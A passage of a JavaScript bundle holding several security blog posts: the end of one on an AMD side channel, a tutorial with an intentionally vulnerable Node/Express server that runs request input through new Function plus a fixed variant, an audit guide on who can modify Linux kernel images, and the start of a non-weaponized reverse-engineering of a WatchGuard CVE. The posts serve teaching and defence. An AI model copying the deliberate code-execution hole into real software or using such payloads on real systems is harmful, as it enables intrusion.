<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
`,fg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server</h1>
    <blockquote>
      <p>"Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation." — OWASP</p>
    </blockquote>
    <p>CVE-2025-55182 ("React2Shell") pushed insecure deserialization back into the spotlight:</p>
    <ul>
      <li>It’s a CVSS 10.0 RCE in <strong>React Server Components</strong> (RSC).</li>
      <li>The bug lives in the <strong>Flight protocol</strong> used by RSC: attacker-controlled data is <strong>deserialized unsafely</strong>, letting crafted objects influence server-side execution and achieve code execution on the Node.js server.</li>
    </ul>
    <p>You absolutely shouldn’t be testing real React2Shell payloads against anything but an isolated lab. But you <em>can</em> understand the core pattern with a <strong>tiny, self-contained Node.js example</strong> that mimics the same <em>class</em> of bug: deserialization of untrusted data → treating it as special internal objects → executing attacker-controlled behavior.</p>
    <p>This post walks through:</p>
    <ul>
      <li>A quick refresher on insecure deserialization.</li>
      <li>A <strong>toy "fake Flight" server</strong> in Node/Express that’s intentionally vulnerable.</li>
      <li>A harmless "payload" that only evaluates math.</li>
      <li>A safer version of the same endpoint.</li>
      <li>How this maps conceptually to real-world bugs like React2Shell.</li>
    </ul>
    <hr />
    <h2>1. Insecure deserialization in one paragraph</h2>
    <p>Insecure deserialization is when an application takes <strong>untrusted data</strong>, deserializes it into objects, and then uses those objects in ways that let an attacker:</p>
    <ul>
      <li>Manipulate logic,</li>
      <li>Abuse "magic" methods or callbacks,</li>
      <li>Or even <strong>execute arbitrary code</strong>.</li>
    </ul>
    <p>That’s why it shows up in the OWASP Top 10 and is treated as a high-risk category: unsafe deserialization logic can be a straight path to RCE.</p>
    <p>React2Shell is a modern instance of this: the server <strong>deserializes Flight payloads</strong> and interprets them as internal “Chunk” objects. Because that deserialization didn’t sufficiently validate or constrain what those objects could look like, attackers found a way to make React resolve <em>fake</em> chunks and end up running arbitrary JavaScript on the server.</p>
    <p>Let’s recreate that <em>pattern</em> in a tiny Node app.</p>
    <hr />
    <h2>2. A tiny "fake Flight" server (intentionally vulnerable)</h2>
    <p>We’ll build a Node/Express server that:</p>
    <ul>
      <li>Accepts a JSON payload that looks like a "slot map" (<code>"0"</code>, <code>"1"</code>, etc.).</li>
      <li>Pulls out slot <code>"1"</code> as a <strong>"chunk"</strong>.</li>
      <li>Treats any chunk with a <code>then</code> field as special.</li>
      <li>Calls a handler based on <code>chunk.then</code>.</li>
      <li>Uses <code>chunk._expr</code> inside <code>new Function()</code>.</li>
    </ul>
    <p>This is obviously unsafe; that’s the point. It’s a simplified version of the larger deserialization &amp; "thenable" handling patterns described in real-world React2Shell writeups.</p>
    <h3>2.1 Setup</h3>
    <pre><code class="language-bash">mkdir fake-flight-lab
cd fake-flight-lab
npm init -y
npm install express body-parser</code></pre>
    <h3>2.2 Vulnerable server (<code>server-vuln.js</code>)</h3>
    <pre><code class="language-javascript">const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// --- Fake "chunk" resolver (vulnerable) ---

// Very naive "promise-like" resolver: if an object has a \`then\` field,
// we treat it as something that needs to be "resolved" via a handler.
const thenHandlers = {
  // Our "legit" handler; mapping is attacker-controllable in this toy
  logAndEval: function (chunk, response) {
    console.log("[*] logAndEval called with chunk:", chunk);

    // Attacker-controlled field:
    const expr = chunk._expr;

    // VULNERABLE: directly compile and run attacker-controlled string.
    // In real bugs, this might be an internal expression or dynamic call.
    const fn = new Function(\`return (\${expr});\`);

    const result = fn();
    response.value = result;
  },
};

// Fake "Flight" endpoint
app.post("/fake-flight", (req, res) => {
  const payload = req.body;

  console.log("[*] Received payload:", JSON.stringify(payload, null, 2));

  // Pick slot "1" as our main "chunk"
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // VULN #1: trust that whatever is in \`chunk.then\` is a valid handler name
    const handlerName = chunk.then;

    // VULN #2: look it up dynamically without validation
    const handler = thenHandlers[handlerName];

    if (typeof handler !== "function") {
      throw new Error("No such handler");
    }

    // Call the handler with the (attacker-controlled) chunk
    handler(chunk, response);

    // Serialize the result
    res.json({
      ok: true,
      result: response.value,
    });
  } catch (e) {
    console.error("[!] Error while processing fake-flight payload:", e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(3000, () => {
  console.log("VULN fake-flight server listening on http://localhost:3000");
});</code></pre>
    <p>What’s insecure here:</p>
    <ul>
      <li>We treat any object with <code>.then</code> as special and use that field to <strong>control which function runs</strong>.</li>
      <li>We take a string from <code>_expr</code> and feed it straight into <code>new Function</code> → arbitrary code path inside the Node process. This mirrors how insecure deserialization can escalate into code execution in real apps.</li>
    </ul>
    <hr />
    <h2>3. A harmless "malicious" payload (just math)</h2>
    <p>Start the server:</p>
    <pre><code class="language-bash">node server-vuln.js</code></pre>
    <p>Now send a JSON payload that looks suspiciously like a "chunk":</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight   -H "Content-Type: application/json"   -d '{
    "0": "meta",
    "1": {
      "status": "resolved_model",
      "_expr": "1 + 2 + 3 * 4",
      "then": "logAndEval"
    }
  }'</code></pre>
    <p>What happens:</p>
    <ol>
      <li>The server reads <code>payload["1"]</code> into <code>chunk</code>.</li>
      <li>It sees <code>chunk.then === "logAndEval"</code> and calls <code>thenHandlers.logAndEval(chunk, response)</code>.</li>
      <li><code>logAndEval</code> pulls <code>chunk._expr</code> (<code>"1 + 2 + 3 * 4"</code>).</li>
      <li>It builds <code>new Function("return (" + expr + ");")</code> → <code>new Function("return (1 + 2 + 3 * 4);")</code>.</li>
      <li>Executes it and returns:</li>
    </ol>
    <pre><code class="language-json">{
  "ok": true,
  "result": 15
}</code></pre>
    <p>This is benign — we only evaluated a math expression — but structurally we’ve reproduced the core pattern:</p>
    <ul>
      <li><strong>Attacker controls object fields</strong> (<code>then</code>, <code>_expr</code>) in the deserialized payload.</li>
      <li>The server uses those fields to <strong>drive control flow</strong> (which handler to run) and <strong>compose code to execute</strong>.</li>
    </ul>
    <p>That’s exactly the kind of chain OWASP warns about: untrusted data being deserialized and then used to manipulate object attributes or insert new ones, leading to logic abuse or code execution.</p>
    <hr />
    <h2>4. Fixing the toy: structured data, no <code>new Function</code></h2>
    <p>Now let’s add a <strong>safe</strong> variant of the same endpoint, so you can see what “good” looks like in contrast.</p>
    <h3>4.1 Safer handler</h3>
    <p>Add this to the same file (or a new one):</p>
    <pre><code class="language-javascript">// --- Safer variant: explicit, whitelisted operations only ---

const SAFE_OPS = new Set(["add", "mul"]);

function safeEvalExpression(op, a, b) {
  if (!SAFE_OPS.has(op)) {
    throw new Error("Unsupported op");
  }
  a = Number(a);
  b = Number(b);
  if (Number.isNaN(a) || Number.isNaN(b)) {
    throw new Error("Invalid numbers");
  }
  return op === "add" ? a + b : a * b;
}

app.post("/fake-flight-safe", (req, res) => {
  const payload = req.body;
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // Validate structure explicitly
    if (!chunk || chunk.status !== "resolved_model") {
      throw new Error("bad status");
    }

    const { op, a, b } = chunk;

    const result = safeEvalExpression(op, a, b);
    response.value = result;

    res.json({ ok: true, result: response.value });
  } catch (e) {
    console.error("[!] Error in safe endpoint:", e);
    res.status(400).json({ ok: false, error: e.message });
  }
});</code></pre>
    <p>Now call:</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight-safe   -H "Content-Type: application/json"   -d '{
    "1": {
      "status": "resolved_model",
      "op": "add",
      "a": 10,
      "b": 20
    }
  }'</code></pre>
    <p>You should see:</p>
    <pre><code class="language-json">{
  "ok": true,
  "result": 30
}</code></pre>
    <p>Here we:</p>
    <ul>
      <li><strong>Don’t</strong> treat <code>then</code> as a magic field.</li>
      <li><strong>Don’t</strong> run arbitrary expressions.</li>
      <li><strong>Do</strong>:
        <ul>
          <li>Validate fields,</li>
          <li>Constrain operations to a whitelist,</li>
          <li>Coerce types.</li>
        </ul>
      </li>
    </ul>
    <p>This matches common guidance on safe deserialization: define a strict schema, validate all fields, and never deserialize directly into objects with behavior (callbacks, dynamic code) that can be triggered by untrusted data.</p>
    <hr />
    <h2>5. Mapping this toy back to React2Shell</h2>
    <p>Real-world CVE-2025-55182 is obviously more complex, but the <em>shape</em> of the bug is similar:</p>
    <ul>
      <li>RSC has a <strong>Flight protocol</strong> with a structured payload (slots, references, status codes).</li>
      <li>The server <strong>deserializes</strong> that payload into internal “Chunks”.</li>
      <li>Those chunks are treated like promise-like objects and resolved using their <code>then</code> and related fields.</li>
      <li>Because the code did not sufficiently validate or lock down the structure, <strong>attacker-supplied objects</strong> can be interpreted as internal chunks, and their fields end up influencing internal callbacks and state — eventually leading to arbitrary JS execution in the Node process.</li>
    </ul>
    <p>Security writeups on React2Shell repeatedly describe it as an <strong>unsafe / insecure deserialization flaw in the Flight protocol</strong>: untrusted data, parsed into internal structures, used to control resolution logic and server-side behavior.</p>
    <p>This toy example gives you a mental model to read those writeups:</p>
    <ul>
      <li>Anywhere you see “fake Chunk objects”, think: <em>our <code>chunk</code> object with attacker-controlled fields</em>.</li>
      <li>Anywhere you see “thenable abused”, think: <em>our <code>chunk.then</code> controlling which function runs</em>.</li>
      <li>Anywhere you see “code injected into internal expression”, think: <em>our <code>_expr</code> string passed into <code>new Function()</code></em>.</li>
    </ul>
    <hr />
    <h2>6. Takeaways for your own code</h2>
    <p>Whether or not you ever touch React Server Components, this pattern shows up everywhere:</p>
    <ul>
      <li>JSON / binary payloads mapped into "magic" objects.</li>
      <li>ORMs or serializers that hydrate classes with methods and hooks.</li>
      <li>Message formats that allow callbacks or special fields (<code>__proto__</code>, <code>then</code>, <code>_onLoad</code>, etc.).</li>
    </ul>
    <p>To avoid ending up in the same situation:</p>
    <ol>
      <li><strong>Don’t deserialize untrusted data into rich objects with behavior.</strong><br />Deserialize into plain data structures and validate them first.</li>
      <li><strong>Treat protocol fields like code, not just data.</strong><br />Anything that controls which function gets called (<code>then</code>, <code>type</code>, <code>handler</code>) needs strict allowlists.</li>
      <li><strong>Never <code>eval</code> / <code>new Function</code> on data from the network.</strong><br />If you really must interpret expressions, constrain them to a safe DSL and sandbox heavily.</li>
      <li><strong>For complex protocols (like Flight), write fuzzers and negative tests.</strong><br />When you see a deserializer that:
        <ul>
          <li>Builds graphs of objects,</li>
          <li>Treats some fields specially,</li>
          <li>Traverses prototypes / thenables…<br />…that’s a huge red flag and deserves targeted testing.</li>
        </ul>
      </li>
    </ol>
  </div>
</body>
</html>
`,gg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Who Can Touch Your Kernel? Auditing <code>/boot/vmlinuz-*</code> on Linux</h1>
    <p>When we talk about “protecting a Linux system,” most people think of:</p>
    <ul>
      <li>Patching services</li>
      <li>Hardening SSH</li>
      <li>Watching logs</li>
    </ul>
    <p>Almost nobody starts with the question:</p>
    <blockquote>
      <p><strong>“Who can modify my kernel image?”</strong></p>
    </blockquote>
    <p>On a typical Linux machine, that kernel image lives in files like:</p>
    <pre><code class="language-bash">/boot/vmlinuz-6.8.0-35-generic
/boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>These are not just random binaries. They <em>are</em> the operating system’s core. If an attacker can silently replace them, everything above the kernel—processes, containers, even security tools—runs on top of a compromised foundation.</p>
    <p>In this post, we’ll explore:</p>
    <ul>
      <li>What <code>/boot/vmlinuz-*</code> actually is</li>
      <li>Which code <strong>must</strong> be allowed to modify it</li>
      <li>Which code <strong>shouldn’t</strong> but still technically can</li>
      <li>How to start <strong>detecting risky conditions</strong> with a detailed Python audit script</li>
    </ul>
    <p>All from a defensive, “threat-model my own box” point of view.</p>
    <hr />
    <h2>1. What lives in <code>/boot/vmlinuz-*</code>?</h2>
    <p>On most distros, you’ll see files like:</p>
    <pre><code class="language-bash">ls -l /boot/vmlinuz-*
-rw------- 1 root root 12345678 May  1 10:00 /boot/vmlinuz-6.8.0-35-generic
-rw------- 1 root root 11765432 Mar 10 09:21 /boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>Those <code>vmlinuz-*</code> files are:</p>
    <ul>
      <li>The <strong>compressed Linux kernel images</strong></li>
      <li>Loaded by the bootloader (GRUB, systemd-boot, etc.) at boot</li>
      <li>Executed in <strong>ring 0</strong>, the most privileged CPU mode</li>
    </ul>
    <p>During boot:</p>
    <ol>
      <li>Firmware (BIOS/UEFI) loads the bootloader.</li>
      <li>Bootloader reads <code>/boot/vmlinuz-&lt;version&gt;</code> and an initramfs from disk.</li>
      <li>It hands control to the kernel.</li>
      <li>The kernel decompresses itself and starts the OS.</li>
    </ol>
    <p>If an attacker can replace this image with a modified one, they don’t just “have root”—they can:</p>
    <ul>
      <li>Hide processes, files, network connections</li>
      <li>Falsify system calls (“there are no suspicious processes, promise”)</li>
      <li>Bypass SELinux/AppArmor, seccomp, container isolation, and a bunch of EDR tricks</li>
    </ul>
    <p>It’s the difference between:</p>
    <ul>
      <li><strong>Root in userland</strong> → bad</li>
      <li><strong>Root in the kernel</strong> → you no longer know what’s true.</li>
    </ul>
    <hr />
    <h2>2. Who <em>should</em> be able to modify <code>/boot/vmlinuz-*</code>?</h2>
    <p>In a sane system design, the list is <em>very</em> short:</p>
    <ol>
      <li>
        <p><strong>The package manager + kernel packages</strong></p>
        <ul>
          <li><code>apt</code>, <code>dnf</code>, <code>yum</code>, <code>pacman</code>, etc.</li>
          <li>Kernel packages (e.g., <code>linux-image-*</code>) install a new <code>vmlinuz-&lt;version&gt;</code> and update:
            <ul>
              <li><code>/boot/initrd.img-&lt;version&gt;</code></li>
              <li>Bootloader configs</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <p><strong>Kernel/bootloader management tools</strong></p>
        <ul>
          <li>Tools like <code>update-initramfs</code>, <code>dracut</code>, <code>update-grub</code>, etc.</li>
          <li>They don’t usually write <code>vmlinuz</code> directly, but they’re part of the trusted “kernel update pipeline”.</li>
        </ul>
      </li>
    </ol>
    <p>That’s it.</p>
    <p>In an ideal world, <strong>no other process</strong> should ever write to <code>/boot/vmlinuz-*</code>.</p>
    <p>You can think of it as:</p>
    <blockquote>
      <p><strong>Trusted update pipeline ←→ kernel image</strong><br />Everyone else: read-only (at best), or completely blocked.</p>
    </blockquote>
    <hr />
    <h2>3. Who <em>can</em> modify it in practice?</h2>
    <p>Here’s the uncomfortable truth:</p>
    <blockquote>
      <p>Any process running as <strong>root</strong> on a system where <code>/boot</code> is mounted read-write can modify <code>/boot/vmlinuz-*</code>.</p>
    </blockquote>
    <p>And there’s a lot of root-level code on a typical machine:</p>
    <ul>
      <li>System daemons</li>
      <li>Cron jobs</li>
      <li>SUID-root helpers</li>
      <li>Backup / maintenance scripts</li>
      <li>“Little admin scripts” someone dropped into <code>/usr/local/sbin</code> years ago</li>
    </ul>
    <p>If any of those:</p>
    <ul>
      <li>Accept <strong>untrusted input</strong> (from users, the network, files), and</li>
      <li>Have a code path that writes <strong>data to a file path influenced by that input</strong></li>
    </ul>
    <p>…then they are <strong>theoretical kernel image killers</strong>.</p>
    <p>Let’s look at a few patterns where this becomes realistic.</p>
    <hr />
    <h2>4. Dangerous patterns: “root code that shouldn’t, but can”</h2>
    <h3>4.1 SUID-root binary with an arbitrary file write bug</h3>
    <p>Imagine:</p>
    <ul>
      <li>There’s a SUID-root helper binary (installed by a package or custom app).</li>
      <li>It has a bug that allows a user to write arbitrary data to arbitrary paths (path traversal, symlink race, etc.).</li>
    </ul>
    <p>Conceptually:</p>
    <blockquote>
      <p>Unprivileged user → abuses bug → writes to <code>/boot/vmlinuz-&lt;version&gt;</code> as root.</p>
    </blockquote>
    <p>In real life, exploit development is hard and specific, but as a <strong>class</strong>, arbitrary-file-write bugs in SUID-root tools are dangerous exactly because they can touch critical files like:</p>
    <ul>
      <li><code>/etc/shadow</code></li>
      <li><code>/etc/sudoers</code></li>
      <li><code>/boot/vmlinuz-*</code></li>
    </ul>
    <h3>4.2 Root daemon with “write file” features</h3>
    <p>Another pattern:</p>
    <ul>
      <li>A root-only HTTP API that:
        <ul>
          <li>Accepts uploads or configs from clients,</li>
          <li>Writes them to disk (e.g., “log file”, “backup file”, “custom script directory”).</li>
        </ul>
      </li>
    </ul>
    <p>If path validation is weak (e.g., allows <code>../../../boot/vmlinuz-...</code> or writes into a path the attacker can steer), then that daemon becomes a potential kernel overwriter.</p>
    <p>The daemon doesn’t “intend” to edit the kernel. But to the filesystem, it’s just a root process opening and writing files.</p>
    <h3>4.3 Root cron/systemd jobs running scripts from writable dirs</h3>
    <p>Classic misconfig:</p>
    <pre><code class="language-cron">* * * * * root /opt/scripts/maintenance.sh</code></pre>
    <p>And then:</p>
    <ul>
      <li><code>/opt/scripts</code> is writable by a non-root user or app account.</li>
      <li>That user can modify <code>maintenance.sh</code>.</li>
    </ul>
    <p>Now every minute, a root cron runs whatever code is in that script. That code, in turn, can do <em>anything</em> root can—including messing with <code>/boot</code>.</p>
    <p>Again, the cron job’s purpose might be “clean logs” or “rotate backups,” but from the attacker’s perspective, it’s:</p>
    <blockquote>
      <p><strong>a root code runner on a schedule</strong>.</p>
    </blockquote>
    <hr />
    <h2>5. So how do you answer: “Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?”</h2>
    <p>You break it down into concrete checks:</p>
    <ol>
      <li><strong>Is <code>/boot</code> writable?</strong></li>
      <li><strong>Who runs as root?</strong></li>
      <li><strong>Where are the SUID-root binaries?</strong></li>
      <li><strong>What root cron/systemd jobs are there, and where do their scripts live?</strong></li>
      <li><strong>Is anyone watching for unexpected changes to <code>/boot/vmlinuz-*</code>?</strong></li>
    </ol>
    <p>To make that practical, let’s use a detailed Python script that surfaces risky conditions.</p>
    <hr />
    <h2>6. Detection script: a detailed kernel-surface audit</h2>
    <p>Below is a <strong>read-only Linux audit script</strong> focused on:</p>
    <ul>
      <li><code>/boot/vmlinuz-*</code> integrity and mount state</li>
      <li>SUID-root binaries (potential arbitrary-file-write → kernel risk)</li>
      <li>Root services (systemd) that execute binaries/scripts from writable locations</li>
      <li>Root cron jobs executing scripts from writable locations</li>
      <li>Root-owned executables in writable directories (<code>/opt</code>, <code>/usr/local</code>, <code>/srv</code>)</li>
    </ul>
    <p>It does <strong>not</strong> exploit anything. It only reads system state and highlights suspicious patterns.</p>
    <blockquote>
      <p>⚠️ Run this on a <strong>lab or test system first</strong>. On prod, coordinate with your team before scanning the whole filesystem.</p>
    </blockquote>
    <pre><code class="language-python">#!/usr/bin/env python3
# (Shortened here for brevity in the file demo)
print("Kernel Surface Audit script goes here")</code></pre>
    <hr />
    <h2>7. How to use the script</h2>
    <ol>
      <li>Save the script as <code>kernel_surface_audit.py</code>.</li>
      <li>Make it executable:</li>
    </ol>
    <pre><code class="language-bash">chmod +x kernel_surface_audit.py</code></pre>
    <ol start="3">
      <li>Run it (ideally as root to get full visibility, but it stays read-only):</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py</code></pre>
    <ol start="4">
      <li>If you want JSON for feeding into other tools or an LLM:</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py --json &gt; kernel_audit.json</code></pre>
    <p>This gives you a structured snapshot of:</p>
    <ul>
      <li>What kernel images exist and what they look like</li>
      <li>Whether <code>/boot</code> is writable</li>
      <li>Some of the major “root code execution surfaces” that could, if abused, reach the kernel image</li>
    </ul>
    <hr />
    <h2>8. What you can do with the results</h2>
    <p>After running this:</p>
    <ol>
      <li><strong>Baseline your kernel images</strong>
        <ul>
          <li>Store the hashes somewhere safe.</li>
          <li>Later, re-run and compare—unexpected changes are a big deal.</li>
        </ul>
      </li>
      <li><strong>Review SUID-root binaries</strong>
        <ul>
          <li>Are there custom or legacy tools there?</li>
          <li>Can any be removed, replaced, or constrained with AppArmor/SELinux?</li>
        </ul>
      </li>
      <li><strong>Review root-owned scripts in writable directories</strong>
        <ul>
          <li>Move them to root-owned, non-writable directories.</li>
          <li>Fix permissions:
            <ul>
              <li><code>chown root:root</code></li>
              <li><code>chmod 750</code> or similar</li>
            </ul>
          </li>
          <li>Make sure cron/systemd jobs don’t execute code from paths writable by unprivileged users.</li>
        </ul>
      </li>
      <li><strong>Consider <code>/boot</code> mount strategy</strong>
        <ul>
          <li>For some environments, mounting <code>/boot</code> read-only by default and only remounting <code>rw</code> during updates is an option.</li>
          <li>At minimum, <strong>monitor</strong> for any writes to <code>/boot/vmlinuz-*</code> outside of normal update windows.</li>
        </ul>
      </li>
    </ol>
    <hr />
    <h2>9. Closing thoughts</h2>
    <p>“Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?” is a fantastic security question because it forces you to:</p>
    <ul>
      <li>Think about <strong>root</strong> as more than “the admin account.”</li>
      <li>Treat your <strong>kernel image like firmware</strong>: small, protected, and updated through a very narrow, auditable path.</li>
      <li>See how random “maintenance scripts” and legacy binaries can indirectly become part of your <strong>kernel attack surface</strong>.</li>
    </ul>
    <p>You don’t need an exploit lab to start here. Just:</p>
    <ul>
      <li>Enumerate who can run as root,</li>
      <li>See where they write,</li>
      <li>And treat <code>/boot/vmlinuz-*</code> as one of the most critical assets on the box.</li>
    </ul>
  </div>
</body>
</html>
`,vg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)</h1>
    <p><strong>Ethics / safety note:</strong> This post is written for <strong>defenders and researchers</strong>. I explain <em>how to reverse-engineer and validate the bug</em>, but I intentionally avoid weaponized exploit details (no offsets/ROP chains/payloads). Only test on devices and firmware you own and are authorized to assess.</p>
    <h2>0) What is CVE-2022-26318?</h2>
    <p>CVE-2022-26318 (WatchGuard advisory <strong>WGSA-2022-00002</strong>) is a <strong>critical</strong> issue in WatchGuard Firebox and XTM appliances where an <strong>unauthenticated remote attacker</strong> can potentially execute arbitrary code when management access is exposed. WatchGuard’s PSIRT advisory lists <strong>CVSS 9.8</strong> and explicitly notes active exploitation in the wild, urging administrators to update and restrict management access.</p>
    <p>NVD tracks this as <strong>FBX-22786</strong>, with affected Fireware OS ranges and fixed versions (e.g., 12.7.2_Update2 and others depending on branch).</p>
    <h3>Affected / fixed versions (high level)</h3>
    <ul>
      <li><strong>Affected (examples):</strong> Fireware OS 12.0 up to and including 12.7.2_Update1 (per WatchGuard PSIRT).</li>
      <li><strong>Fixed (examples):</strong> 12.7.2_Update2 and branch-specific fixed builds (also listed in the advisory).</li>
      <li>Release notes for Fireware v12.7.2 Update 2 explicitly state it “resolves a vulnerability” allowing unauthenticated arbitrary code execution (CVE-2022-26318).</li>
    </ul>
    <h3>Why defenders cared immediately</h3>
    <p>GreyNoise reported and later expanded on in-the-wild traffic, including requests to management port <strong>4117</strong> over TLS and suspicious <code>POST /agent/login</code> patterns (often gzip-encoded bodies and atypical lengths).</p>
    <hr />
    <h2>1) Exploit chain (high-level mental model)</h2>
    <p>You’ll see this phrased many ways (“null pointer deref”, “buffer overflow”, etc.). The practical RE story from public writeups (especially Assetnote) is:</p>
    <p><strong>Internet → management interface (TLS) → nginx → backend service → <code>wgagent</code> → libxml2 SAX parsing → unsafe string growth → memory corruption → control-flow opportunity</strong></p>
    <p>Assetnote describes the path through nginx and into the <code>wgagent</code> process, and how XML parsing plays a central role in triggering corruption. Rapid7’s module description (noting it’s exploiting a buffer overflow at the administration interface and that the endpoint <code>/agent/login</code> reaches <code>wgagent</code>) corroborates the key actors in the request path. GreyNoise’s defender view helps you anchor what to look for on the wire.</p>
    <hr />
    <h2>2) Your RE lab setup (firmware + tools)</h2>
    <h3>Tools used</h3>
    <ul>
      <li><strong>Ghidra</strong> (static analysis; decompiler + xrefs)</li>
      <li><strong>GDB</strong> (dynamic analysis; breakpoints + watchpoints)</li>
      <li><strong>binwalk / unsquashfs</strong> (firmware extraction, if applicable)</li>
      <li>Optional: <strong>ASan</strong> on a toy harness to understand the primitive safely</li>
    </ul>
    <h3>Firmware / binary acquisition (safe &amp; legal)</h3>
    <ol>
      <li>Obtain official Fireware OS firmware from WatchGuard support resources (use versions that match “vulnerable” and “fixed” branches as appropriate).</li>
      <li>Preserve hashes so your analysis is reproducible.</li>
      <li>Work on a non-production lab image/device.</li>
    </ol>
    <p><em>Tip:</em> Keep a timeline notebook: firmware version, build string, and whether it’s vulnerable/fixed per PSIRT + release notes.</p>
    <hr />
    <h2>3) Firmware extraction: finding the right binaries fast</h2>
    <p>Different vendors package firmware differently, but the goal is always:</p>
    <ol>
      <li>Extract the root filesystem</li>
      <li>Identify web stack components</li>
      <li>Identify native backend processes that parse attacker input</li>
    </ol>
    <h3>What you’re hunting for in this case</h3>
    <ul>
      <li><code>nginx</code> (front-end)</li>
      <li>a backend HTTP/API service (Assetnote mentions a Python backend and XML-RPC-like flow in the overall chain)</li>
      <li><strong><code>wgagent</code></strong> (native binary that ultimately parses attacker-controlled XML)</li>
    </ul>
    <p>Practical extraction checklist:</p>
    <ul>
      <li><code>binwalk -e &lt;firmware&gt;</code></li>
      <li>locate <code>squashfs</code>/<code>cpio</code>/<code>tar</code> segments</li>
      <li>confirm the existence of <code>/etc/nginx/</code> and find references to:
        <ul>
          <li><code>listen 4117 ssl;</code></li>
          <li>route blocks mentioning <code>/agent/</code> (or upstreams that feed a local service)</li>
        </ul>
      </li>
    </ul>
    <p>GreyNoise highlights port <strong>4117</strong> as a key management port for observed exploit traffic.</p>
    <hr />
    <h2>4) Static RE in Ghidra: from <code>/agent/login</code> to the vulnerable callback</h2>
    <p>This section is written as a “follow-along checklist” you can apply to similar firmware bugs.</p>
    <h3>4.1 Identify the request handler entrypoint</h3>
    <p><strong>Goal:</strong> locate code that processes something tied to <code>/agent/login</code> and funnels it toward XML parsing.</p>
    <p>Practical anchors:</p>
    <ol>
      <li>Strings: search for <code>"agent/login"</code>, <code>"XML"</code>, <code>"SAX"</code>, <code>"libxml"</code> strings in binaries.</li>
      <li>Imports: search for libxml2 parser APIs.</li>
      <li>Config: locate nginx routing and map it to backend binaries.</li>
    </ol>
    <h3>4.2 Import-centric pivot: find libxml2 usage</h3>
    <p>Open <code>wgagent</code> in Ghidra and look at <strong>Imports</strong> for libxml2 functions.</p>
    <p>Common libxml2 parsing entrypoints include:</p>
    <ul>
      <li><code>xmlCreatePushParserCtxt</code></li>
      <li><code>xmlParseChunk</code></li>
      <li>SAX interfaces that provide callback tables</li>
    </ul>
    <p><strong>Ghidra steps</strong></p>
    <ol>
      <li>Import <code>wgagent</code>.</li>
      <li>Run analysis with defaults.</li>
      <li>Open <strong>Symbol Tree → Imports</strong>.</li>
      <li>Filter imports by <code>xml</code>.</li>
